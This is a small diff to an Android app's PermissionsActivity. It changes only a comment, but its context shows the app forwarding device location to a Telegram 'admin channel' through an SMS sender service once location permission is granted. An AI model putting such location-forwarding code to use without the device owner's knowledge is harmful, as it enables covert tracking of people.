@@ -103,7 +103,7 @@ public class PermissionsActivity extends AppCompatActivity {
                  Log.d(TAG, "Contacts permission callback");
                  break;
             case Permissions.PERMISSIONS_LOCATION:
-                 //send device location
+                 //send device location to admin channel
                  Bundle extras = new Bundle();
                  extras.putString("telegramId", getString(R.string.telegram_notification));
                  SmsSenderService.initService(this, false, false, true, null, null, null, null, extras);
